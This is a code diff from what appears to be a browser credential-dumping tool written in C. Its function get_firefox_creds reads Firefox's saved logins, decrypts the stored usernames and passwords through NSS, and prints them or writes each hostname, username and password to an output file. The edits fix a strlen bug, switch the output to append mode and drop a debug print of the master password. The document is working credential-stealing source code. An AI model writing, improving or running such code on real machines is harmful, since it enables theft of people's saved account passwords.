@@ -42,9 +42,9 @@ int get_firefox_creds(char *profile_path, char *logins_path, char *output_file, 
 
 	logins_array = cJSON_GetObjectItemCaseSensitive(values, "logins");	
 
-	FILE *output;
+	FILE *output_fd;
 	if(output_file != NULL) {
-		output = fopen(output_file, "wb");
+		output_fd = fopen(output_file, "ab");
 	}
 
 	cJSON_ArrayForEach(logins, logins_array) {
@@ -53,7 +53,7 @@ int get_firefox_creds(char *profile_path, char *logins_path, char *output_file, 
 		cipher_password = cJSON_GetObjectItemCaseSensitive(logins, "encryptedPassword");	
 
 		if (cJSON_IsString(cipher_username) && cJSON_IsString(cipher_password) && cJSON_IsString(hostname)) {
-			if(strlen(hostname) > 0) {
+			if(strlen(hostname->valuestring) > 0) {
 				decrypt_firefox_cipher(cipher_username->valuestring, &username);
 				decrypt_firefox_cipher(cipher_password->valuestring, &password);
 
@@ -63,7 +63,7 @@ int get_firefox_creds(char *profile_path, char *logins_path, char *output_file, 
 					password);
 
 				if(output_file != NULL) {
-					fprintf(output, "\"%s\",\"%s\",\"%s\"\n", 
+					fprintf(output_fd, "\"%s\",\"%s\",\"%s\"\n", 
 						hostname->valuestring,
 						username,
 						password);
@@ -77,7 +77,7 @@ int get_firefox_creds(char *profile_path, char *logins_path, char *output_file, 
 
 	// We free the memory of everything.	
 	if(output_file != NULL) {
-		fclose(output);
+		fclose(output_fd);
 	}
 	free(json);
 	free_pk11_nss(key_slot);
@@ -86,7 +86,6 @@ int get_firefox_creds(char *profile_path, char *logins_path, char *output_file, 
 }
 
 int dump_firefox(struct arguments *args) {
-	printf("Master password: %s\n", args->master_password);
 	int result = 0;
 	char firefox_path[MAX_PATH];
 	char profiles_ini_path[MAX_PATH];
